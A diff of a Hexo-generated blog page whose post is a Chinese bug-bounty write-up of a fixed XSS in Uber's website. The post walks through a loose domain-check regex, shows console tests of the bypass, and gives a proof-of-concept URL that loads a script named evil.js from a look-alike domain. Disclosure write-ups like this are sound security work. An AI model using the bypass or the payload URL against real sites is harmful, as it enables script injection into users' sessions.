@@ -17,7 +17,7 @@
 
 <script id="hexo-configurations">
     var NexT = window.NexT || {};
-    var CONFIG = {"hostname":"zhchbin.github.io","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+    var CONFIG = {"hostname":"zhchbin.github.io","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
   <meta name="description" content="前言两个月前的一天，在Hackerone上看了不少报告之后的我跃跃欲试，不自量力地给自己定下一个目标：一定要找一个能够获得Bounty的漏洞！然后，前后差不多花了三天的时候，找到了Uber网站的一个XSS漏洞。今早也顺利地收获了人生的第一笔奖金，$7000。接下来就分享一下这个漏洞吧。 漏洞代码在看Uber的网站前端JS代码的时候，发现有如下的一段代码： 123456789101112131415">
@@ -28,13 +28,13 @@
 <meta property="og:site_name" content="zhchbin">
 <meta property="og:description" content="前言两个月前的一天，在Hackerone上看了不少报告之后的我跃跃欲试，不自量力地给自己定下一个目标：一定要找一个能够获得Bounty的漏洞！然后，前后差不多花了三天的时候，找到了Uber网站的一个XSS漏洞。今早也顺利地收获了人生的第一笔奖金，$7000。接下来就分享一下这个漏洞吧。 漏洞代码在看Uber的网站前端JS代码的时候，发现有如下的一段代码： 123456789101112131415">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http://ww3.sinaimg.cn/large/7184df6bgw1f7otlqoccoj211i03xjsu.jpg">
-<meta property="og:image" content="http://ww4.sinaimg.cn/large/7184df6bgw1f7otuv4e5hg20sb0k6x6p.gif">
-<meta property="og:updated_time" content="2016-10-02T05:43:40.000Z">
+<meta property="og:image" content="http://zhchbin.github.io/images/7184df6bgw1f7otlqoccoj211i03xjsu.jpg">
+<meta property="og:image" content="http://zhchbin.github.io/images/7184df6bgw1f7otuv4e5hg20sb0k6x6p.gif">
+<meta property="og:updated_time" content="2022-05-15T03:29:03.456Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="[BBP系列一] 人生第一个值钱的XSS漏洞">
 <meta name="twitter:description" content="前言两个月前的一天，在Hackerone上看了不少报告之后的我跃跃欲试，不自量力地给自己定下一个目标：一定要找一个能够获得Bounty的漏洞！然后，前后差不多花了三天的时候，找到了Uber网站的一个XSS漏洞。今早也顺利地收获了人生的第一笔奖金，$7000。接下来就分享一下这个漏洞吧。 漏洞代码在看Uber的网站前端JS代码的时候，发现有如下的一段代码： 123456789101112131415">
-<meta name="twitter:image" content="http://ww3.sinaimg.cn/large/7184df6bgw1f7otlqoccoj211i03xjsu.jpg">
+<meta name="twitter:image" content="http://zhchbin.github.io/images/7184df6bgw1f7otlqoccoj211i03xjsu.jpg">
 
 <link rel="canonical" href="http://zhchbin.github.io/2016/09/10/A-Valuable-XSS/">
 
@@ -121,6 +121,16 @@
     <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
 
   </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
+
+  </li>
         <li class="menu-item menu-item-archives">
 
     <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
@@ -157,7 +167,7 @@
     <link itemprop="mainEntityOfPage" href="http://zhchbin.github.io/2016/09/10/A-Valuable-XSS/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="image" content="/images/avatar.jpeg">
       <meta itemprop="name" content="Chaobin Zhang">
       <meta itemprop="description" content="">
     </span>
@@ -184,7 +194,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2016-10-02 13:43:40" itemprop="dateModified" datetime="2016-10-02T13:43:40+08:00">2016-10-02</time>
+                <time title="Modified: 2022-05-15 11:29:03" itemprop="dateModified" datetime="2022-05-15T11:29:03+08:00">2022-05-15</time>
               </span>
 
           
@@ -204,9 +214,10 @@
 <p>目前代码还能在：<a href="https://tags.tiqcdn.com/utag/uber/main/prod/utag.273.js" target="_blank" rel="noopener">https://tags.tiqcdn.com/utag/uber/main/prod/utag.273.js</a> 看到，不过修复之后相应的网站已经不会加载这个代码文件了。 通过阅读上面这段代码，我们能够知道参数是<code>kxsrc</code>是可以被用户控制的，而且如果满足一定条件，该参数所指定的js文件就会被加载。</p>
 <h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>咋一看，这段代码似乎没有什么问题：JS文件只能是<code>krxd.net</code>域下的文件。然而，在正则表达式里：<code>.</code>代表的意思是匹配任意字符。我们来做一个简单的实验，F12打开浏览器的调试窗口：</p>
 <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="regexp">/^https?:\/\/([a-z0-9-.]+.)?krxd.net(:\d&#123;1,5&#125;)?\/controltag\//i</span>.test(<span class="string">'https://a.bkrxd.net/controltag/evil.js'</span>)</span><br><span class="line">&lt; <span class="literal">true</span></span><br><span class="line">&gt; <span class="regexp">/^https?:\/\/([a-z0-9-.]+.)?krxd.net(:\d&#123;1,5&#125;)?\/controltag\//i</span>.test(<span class="string">'https://a.ckrxd.net/controltag/evil.js'</span>)</span><br><span class="line">&lt; <span class="literal">true</span></span><br><span class="line">&gt; <span class="regexp">/^https?:\/\/([a-z0-9-.]+.)?krxd.net(:\d&#123;1,5&#125;)?\/controltag\//i</span>.test(<span class="string">'https://a.dkrxd.net/controltag/evil.js'</span>)</span><br><span class="line">&lt; <span class="literal">true</span></span><br><span class="line">&gt;  <span class="regexp">/^https?:\/\/([a-z0-9-.]+.)?krxd.net(:\d&#123;1,5&#125;)?\/controltag\//i</span>.test(<span class="string">'https://a.ekrxd.net/controltag/evil.js'</span>)</span><br><span class="line">&lt; <span class="literal">true</span></span><br><span class="line">&gt;  <span class="regexp">/^https?:\/\/([a-z0-9-.]+.)?krxd.net(:\d&#123;1,5&#125;)?\/controltag\//i</span>.test(<span class="string">'https://a.fkrxd.net/controltag/evil.js'</span>)</span><br><span class="line">&lt; <span class="literal">true</span></span><br><span class="line">&gt;  <span class="regexp">/^https?:\/\/([a-z0-9-.]+.)?krxd.net(:\d&#123;1,5&#125;)?\/controltag\//i</span>.test(<span class="string">'https://aafkrxd.net/controltag/evil.js'</span>)</span><br><span class="line">&lt; <span class="literal">true</span></span><br><span class="line">&gt;  <span class="regexp">/^https?:\/\/([a-z0-9-.]+.)?krxd.net(:\d&#123;1,5&#125;)?\/controltag\//i</span>.test(<span class="string">'https://abfkrxd.net/controltag/evil.js'</span>)</span><br><span class="line">&lt; <span class="literal">true</span></span><br></pre></td></tr></table></figure>
-<p><img src="http://ww3.sinaimg.cn/large/7184df6bgw1f7otlqoccoj211i03xjsu.jpg" alt=""></p>
-<h2 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h2><p>买个域名！部署一下HTTPS！写一个简单的JS文件！添加到参数里！Bingo，就是这么神奇！<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.uber.com/?exp=hp-c&amp;kxsrc=https%3A%2F%2Fwww.akrxd.net%2Fcontroltag%2Fevil.js</span><br></pre></td></tr></table></figure></p>
-<p><img src="http://ww4.sinaimg.cn/large/7184df6bgw1f7otuv4e5hg20sb0k6x6p.gif" alt=""></p>
+<p><img src="/images/7184df6bgw1f7otlqoccoj211i03xjsu.jpg" alt=""></p>
+<h2 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h2><p>买个域名！部署一下HTTPS！写一个简单的JS文件！添加到参数里！Bingo，就是这么神奇！
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.uber.com/?exp=hp-c&amp;kxsrc=https%3A%2F%2Fwww.akrxd.net%2Fcontroltag%2Fevil.js</span><br></pre></td></tr></table></figure></p>
+<p><img src="/images/7184df6bgw1f7otuv4e5hg20sb0k6x6p.gif" alt=""></p>
 <p>思考题: 写这段正则判断代码的人应该还希望限制路径，但其实很容易就可以被绕过，怎么绕呢？</p>
 
     </div>
@@ -293,12 +304,13 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞代码"><span class="nav-number">2.</span> <span class="nav-text">漏洞代码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞分析"><span class="nav-number">3.</span> <span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PoC"><span class="nav-number">4.</span> <span class="nav-text">PoC</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
       <div class="site-overview-wrap sidebar-panel">
         <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Chaobin Zhang"
+      src="/images/avatar.jpeg">
   <p class="site-author-name" itemprop="name">Chaobin Zhang</p>
   <div class="site-description" itemprop="description"></div>
 </div>
@@ -307,7 +319,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">20</span>
+          <span class="site-state-item-count">19</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -317,11 +329,20 @@
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
+          
         <span class="site-state-item-count">8</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
 </div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/zhchbin" title="GitHub → https://github.com/zhchbin" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://hackerone.com/zhchbin" title="Hackerone → https://hackerone.com/zhchbin" rel="noopener" target="_blank"><i class="fa fa-fw"></i>Hackerone</a>
+      </span>
+  </div>
 
 
 
